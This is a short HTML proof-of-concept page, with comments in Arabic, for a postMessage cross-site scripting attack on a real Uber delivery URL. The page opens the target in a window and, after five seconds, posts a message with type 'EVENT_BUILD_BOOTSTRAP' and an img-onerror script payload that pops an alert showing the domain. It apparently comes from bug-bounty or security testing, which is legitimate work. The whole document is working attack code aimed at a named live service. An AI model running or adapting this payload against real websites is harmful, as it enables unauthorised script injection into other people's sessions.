<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC Exploit</title>
</head>
<body>
    <h1>Testing PostMessage XSS...</h1>
    <script>
        // 1. فتح نافذة Uber المستهدفة
        const victimUrl = "https://delivery.uber.com/?app_clip=false&source_flow=undefined";
        const victim = window.open(victimUrl);

        // 2. إرسال الرسالة الخبيثة بعد ثوانٍ من التحميل
        setTimeout(() => {
            victim.postMessage({
                type: "EVENT_BUILD_BOOTSTRAP", // النوع الذي يتوقعه الكود الذي أرسلته
                pixelCode: "123",
                // إذا كان هناك ضعف في معالجة البيانات، سيتم تنفيذ الكود
                data: "<img src=x onerror=alert('XSS_SUCCESS_AT_'+document.domain)>"
            }, "*"); 
        }, 5000); // ننتظر 5 ثوانٍ لضمان تحميل الصفحة
    </script>
</body>
</html>
